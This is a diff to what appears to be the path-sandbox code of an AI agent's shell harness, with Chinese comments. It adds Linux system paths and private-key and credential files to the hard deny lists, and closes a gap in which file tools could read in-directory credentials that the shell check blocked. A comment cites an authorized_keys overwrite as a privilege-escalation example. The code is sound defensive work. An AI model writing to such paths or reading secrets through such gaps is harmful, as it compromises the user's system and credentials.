+            hd_rule="P1"; hd_msg="工作目录外的私钥/证书文件(.pem/.key/.p12/.pfx/id_rsa 等)不可访问,内容与凭据文件同判:auto 档直接拒,非 auto 档须用户本人逐字输入 yes 才放行。替代:请用户自己提供所需的值"
+            return 0
+        fi
     fi
 
     # P2/P3 写侧裁决。坑:比较模式必须**不加引号**才会按 glob 匹配
@@ -3406,13 +3649,10 @@ hard_deny_path() {
         # 工作目录内的写优先放行 —— 必须排在系统路径判据**之前**:测试与开发时
         # WORK_ROOT 本身就可能落在 /private/var/... 或 /Users/Shared 下,先判系统
         # 路径会把"在自己项目里写文件"误拒(P2 命中 /private/*)。
-        # 例外:WORK_ROOT 就是家目录或根目录时不给这条特权,否则 ~/.zshrc 这类
-        # 会成为"工作目录内的普通写",dotfile 红线形同虚设。
-        if [[ "$WORK_ROOT" != "$HOME" && "$WORK_ROOT" != "/" ]]; then
-            case "$np" in
-                "$WORK_ROOT"|"$WORK_ROOT"/*) return 1 ;;
-            esac
-        fi
+        # 边界与它的两条例外(工作根==$HOME 或 /、末段链接落到边界外)统一由
+        # in_root_exempt / hard_deny_path 顶部的 LINK 定义,这里不再抄一遍条件:
+        # 同一条规矩散在三处各写各的,正是上一轮"判据说拒、链路放行"能存活那么久的原因。
+        in_root_exempt "$np" && return 1
         # 临时目录先放行:编译器/构建工具/heredoc 大量写 $TMPDIR,拦下来只会把
         # 任务卡死。比对用物理前缀(见 auto_tmp_prefixes 注释);字面量 /tmp 系列
         # 一并列出兜底 —— 数组因故未初始化时,不能退化成"临时目录也拒",那样
@@ -3425,10 +3665,27 @@ hard_deny_path() {
         case "$np" in
             /dev/null|/dev/stdin|/dev/stdout|/dev/stderr|/dev/zero) return 1 ;;
         esac
+        # 系统路径名单必须**两平台并集**。原清单只有 macOS 形状(/System /Library
+        # /private /Applications /Volumes /var/root),Linux 该有的 /proc /sys /run
+        # /boot /lib /lib64 /srv /media /mnt /var /root 一个没列 —— 后果不是"漏放",而是
+        # 这些写入掉到下面的 P3:P3 在 full 档 + --allow-write 命中时**可放开**,P2
+        # 永不放开。等于同一类"改内核参数/覆盖系统库"的动作,在 Linux 上比 macOS
+        # 低一档红线等级,且拒绝文案把人误导去加 --allow-write。
+        # `/root` 与 macOS 侧已有的 `/var/root` 成对:两者都是 root 的家目录,
+        # 漏掉它就意味着 `echo k > /root/.ssh/authorized_keys` 这类最典型的提权写法
+        # 在 Linux 上只是一条可放开的 P3。它以 **root** 身份跑时 HOME=/root,而 HOME
+        # 检查在本 case 之前,不会自伤。
+        # 刻意**不列 /home**:它在 Linux 上的角色就是 macOS 的 /Users(用户目录,
+        # 工作目录常常就在其下),而 /Users 本来就不在这份名单里 —— 越界写由 P3 管,
+        # 家目录里的隐藏配置由下面那条 $HOME/.xxx 管。两边必须同构,别单侧加严。
         case "$np" in
             /|/etc|/etc/*|/usr|/usr/*|/bin|/bin/*|/sbin|/sbin/*|/System|/System/*|\
             /Library|/Library/*|/private|/private/*|/Applications|/Applications/*|\
-            /Volumes|/Volumes/*|/opt|/opt/*|/var/root|/var/root/*|/dev|/dev/*)
+            /Volumes|/Volumes/*|/opt|/opt/*|/var/root|/var/root/*|/dev|/dev/*|\
+            /proc|/proc/*|/sys|/sys/*|/run|/run/*|/boot|/boot/*|\
+            /lib|/lib/*|/lib64|/lib64/*|/srv|/srv/*|/media|/media/*|/mnt|/mnt/*|\
+            /var|/var/*|\
+            /root|/root/*)
                 hd_rule="P2"; hd_msg="写入系统路径被禁止(持久改变环境,且不在 checkpoint 覆盖范围)。替代:写到工作目录内或 /tmp。注意 --allow-write 放不开这条(P2 在越界名单判定之前就已拒绝,名单只对'工作目录外的普通路径'生效且仅 full 档),确需改系统文件请用户自己执行"
                 return 0 ;;
         esac
@@ -3617,13 +3874,32 @@ confirm_cmd() {
 # 一处,免得以后加档位再改 6 遍。
 #   $1 原始路径  $2 r|rw  $3 动作名(读/写入/修改/列出/搜索/读图,用于回传文案)
 path_access() {
-    local p="$1" mode="$2" act="${3:-访问}" np outside=1
+    local p="$1" mode="$2" act="${3:-访问}" np outside=1 wallhit=0
     # 1) 已授权名单(含 @ 手势与前面放行过的)
     if is_granted "$p" "$mode"; then
         return 0
     fi
+    # 1.5) 归一后落在工作目录内的路径,也要过一次判据。
+    #      六个文件工具以前只在 resolve_path 失败(=越界)时才调本函数,而 resolve_path
+    #      只回答"在不在目录内",从不回答"该不该给" —— 于是 hard_deny_path 那份名单在
+    #      链路层只有 shell 侧 H6 在守,判据与链路是两回事(T8 的 pd deny 测的是判据本体)。
+    #      本步只负责"把目录内路径也送进判据",**不在这里判边界**:目录内到底有多大特权,
+    #      由 in_root_exempt 一处定义(含两条例外:工作根==$HOME 或 / 时边界本身失效、
+    #      末段链接落到边界外)。同一条规矩抄三遍正是上一轮"判据说拒、链路放行"能活那么久的原因。
+    #      命中墙不在此直拒,继续走第 2 步:非 auto 保留人工逐字确认这个出口,auto 按档硬拒。
+    local npin
+    npin=$(resolve_path "$p" 2>/dev/null) || npin=""
+    if [[ -n "$npin" ]]; then
+        if hard_deny_path "$npin" "$mode"; then
+            wallhit=1
+        else
+            return 0
+        fi
+    fi
     # 2) 硬墙:auto 下直接拒并回传规则号;非 auto 交给下面的严格确认
-    if hard_deny_path "$p" "$mode"; then
+    #    用上面归一好的路径判(相对路径 `cat .npmrc` 这类只有归一后才认得出是 dotfile;
+    #    resolve_path 失败时 npin 为空,退回原始 $p,越界那条路的既有语义不变)
+    if hard_deny_path "${npin:-$p}" "$mode"; then
         if [[ -n "$auto_mode" ]]; then
             auto_note_deny
             auto_audit path "$act" "$p" "$hd_rule" auto_deny "$hd_msg"
@@ -3641,10 +3917,13 @@ path_access() {
             "$WORK_ROOT"|"$WORK_ROOT"/*) outside=0 ;;
         esac
     fi
-    if (( ! outside )); then
+    if (( ! outside )) && (( ! wallhit )); then
         # 归一化后在工作目录内、却被 resolve_path 拒绝的,只剩一种可能:路径里
         # 有"缺失段含 .."或父目录无法进入(权限/符号链接异常)——都是穿越尝试的
         # 特征,直接拒,不弹人工确认(让人批一个归一不明白的路径没有意义)
+        # wallhit 为 1 时不进这里:那条"在目录内"是第 1.5 步亲口认的(工作根==$HOME
+        # 这种布局),此处拒的是"归一不明白",两者混在一起会把 dotfile 红线报成
+        # "路径无法安全归一",用户看到的是假故障而不是墙。
         content="错误:${act}被拒绝:路径无法安全归一(可能含 .. 穿越或父目录不可进入): $p"
         printf ' ⛔ %s:路径无法安全归一:%s\n' "$act" "$p"
         return 1
@@ -3885,11 +4164,11 @@ tool_read_file() {
     [[ -z "$offset" || "$offset" == "null" ]] && offset=1
     [[ -z "$limit" || "$limit" == "null" ]] && limit=0
 
-    if ! resolved=$(resolve_path "$path"); then
-        # 沙箱拒绝 → 统一裁决(名单/硬墙/auto 自批只读/人工确认),见 path_access
-        path_access "$path" r "读" || return 0
-        resolved="$(expand_tilde "$path")"
-    fi
+    # 沙箱内外走同一个裁决入口:resolve_path 只回答"在不在目录内",不回答"该不该给"。
+    # 以前只在它失败时才调 path_access,于是目录内的凭据文件 read_file 直读、cat 被拦。
+    resolved=$(resolve_path "$path") || resolved=""
+    path_access "$path" r "读" || return 0
+    [[ -n "$resolved" ]] || resolved="$(expand_tilde "$path")"
     [[ -f "$resolved" ]] || { content="错误:文件不存在: $path"; printf ' ⛔ 文件不存在:%s\n' "$path"; return 0; }
 
     total_lines=$(wc -l < "$resolved" | tr -d ' ')
@@ -3914,10 +4193,9 @@ tool_read_file() {
 tool_write_file() {
     local path resolved
     path=$(jq -r '.path // empty' <<< "$fn_args")
-    if ! resolved=$(resolve_path "$path"); then
-        path_access "$path" rw "写入" || return 0
-        resolved="$(expand_tilde "$path")"
-    fi
+    resolved=$(resolve_path "$path") || resolved=""
+    path_access "$path" rw "写入" || return 0
+    [[ -n "$resolved" ]] || resolved="$(expand_tilde "$path")"
 
     mkdir -p "$(dirname "$resolved")" 2>/dev/null || { content="错误:无法创建目录: $path"; return 0; }
     # auto 模式下覆盖前落备份(~/.ct/auto/backup,不污染工作树)。auto 去掉了人工
@@ -3938,10 +4216,9 @@ tool_edit_file() {
     old_str=$(jq -r '.old_string // empty' <<< "$fn_args")
     new_str=$(jq -r '.new_string // empty' <<< "$fn_args")
 
-    resolved=$(resolve_path "$path") || {
-        path_access "$path" rw "修改" || return 0
-        resolved="$(expand_tilde "$path")"
-    }
+    resolved=$(resolve_path "$path") || resolved=""
+    path_access "$path" rw "修改" || return 0
+    [[ -n "$resolved" ]] || resolved="$(expand_tilde "$path")"
     [[ -f "$resolved" ]] || { content="错误:文件不存在: $path"; printf ' ⛔ 文件不存在:%s\n' "$path"; return 0; }
     [[ -z "$old_str" ]] && { content="错误:old_string 不能为空"; return 0; }
 
@@ -3968,10 +4245,9 @@ tool_list_dir() {
     local path resolved files dirs
     path=$(jq -r '.path // empty' <<< "$fn_args")
     [[ -z "$path" || "$path" == "null" ]] && path="."
-    resolved=$(resolve_path "$path") || {
-        path_access "$path" r "列出目录" || return 0
-        resolved="$(expand_tilde "$path")"
-    }
+    resolved=$(resolve_path "$path") || resolved=""
+    path_access "$path" r "列出目录" || return 0
+    [[ -n "$resolved" ]] || resolved="$(expand_tilde "$path")"
     [[ -d "$resolved" ]] || { content="错误:目录不存在: $path"; return 0; }
 
     files=$(find "$resolved" -maxdepth 1 -type f -exec basename {} \; | sort)
@@ -3989,10 +4265,9 @@ tool_grep() {
     [[ -z "$max_matches" || "$max_matches" == "null" ]] && max_matches=$GREP_MAX_MATCHES
 
     if [[ -n "$path" && "$path" != "null" ]]; then
-        if ! resolved=$(resolve_path "$path"); then
-            path_access "$path" r "搜索" || return 0
-            resolved="$(expand_tilde "$path")"
-        fi
+        resolved=$(resolve_path "$path") || resolved=""
+        path_access "$path" r "搜索" || return 0
+        [[ -n "$resolved" ]] || resolved="$(expand_tilde "$path")"
     else
         resolved="$WORK_ROOT"
     fi
@@ -4536,11 +4811,10 @@ describe_images() {
 tool_read_image() {
     local path resolved
     path=$(jq -r '.path // empty' <<< "$fn_args")
-    if ! resolved=$(resolve_path "$path"); then
-        # 沙箱拒绝 → 统一裁决(auto 下图片按只读放行;命中 P1 凭据类一律拒)
-        path_access "$path" r "读图" || return 0
-        resolved="$(expand_tilde "$path")"
-    fi
+    # 沙箱内外同一个裁决入口(auto 下图片按只读放行;命中 P1 凭据类一律拒)
+    resolved=$(resolve_path "$path") || resolved=""
+    path_access "$path" r "读图" || return 0
+    [[ -n "$resolved" ]] || resolved="$(expand_tilde "$path")"
     [[ -f "$resolved" ]] || { content="错误:文件不存在: $path"; printf ' ⛔ 文件不存在:%s\n' "$path"; return 0; }
     is_image "$resolved" || { content="错误:不是支持的图片格式(仅 JPEG/PNG/GIF/WebP/BMP): $path"; printf ' ⛔ 非图片文件:%s\n' "$path"; return 0; }
 
